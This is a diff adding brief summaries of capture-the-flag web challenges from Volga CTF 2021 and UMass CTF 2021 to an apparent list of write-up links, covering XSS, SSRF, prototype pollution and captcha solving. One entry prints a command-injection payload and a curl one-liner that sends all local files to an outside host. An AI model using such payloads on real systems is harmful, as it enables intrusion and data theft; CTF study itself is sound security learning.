@@ -1287,6 +1287,27 @@ Write-up repos used over time:
     websocket chat based on e2ee, sniff chatting room using socket.io client then perform padding oracle attack to recover flag
     https://hackmd.io/@stypr233/linectf
 
+### static site - volga-ctf-quals-2021
+    xss and csp bypass via nginx $uri vuln to header injection
+    https://ctftime.org/task/15184
+
+### unicorn networks - volga-ctf-quals-2021
+    ssrf via 302 to access http://localhost/admin because axios 0.21.0 will not use squid proxy after a redirect
+    systeminformation vuln to command injection via `?name[]=$(ls)` so exfil flag with `curl -d "$(cat ./*)" me.com`
+    https://ctftime.org/task/15180
+
+### online wallet - volga-ctf-quals-2021
+    part 1: json interoperability vulnerability but many unintended solves via race
+    part 2: xss, list s3 bucket files and find `deparam.js` which converts parameters from `location.search` to an object
+    use `?lang=` to import it and although object is instantiated without a prototype with `Object.create(null)`
+    it is vuln to prototype pollution because it supports arrays through which we can get to the object prototype
+    use jQuery gadget and automatically show tooltip via onfocus by loading site in an iframe and updating src to `#depositButton`
+    https://ctftime.org/task/15186
+
+### pikcha2 - umass-ctf-2021
+    use opencv to solve 4 pokemon image captchas by splitting the image into 4 parts
+    https://ctftime.org/writeup/26806
+
 </p></details>
 <!-- }}} -->
 <!-- }}} -->
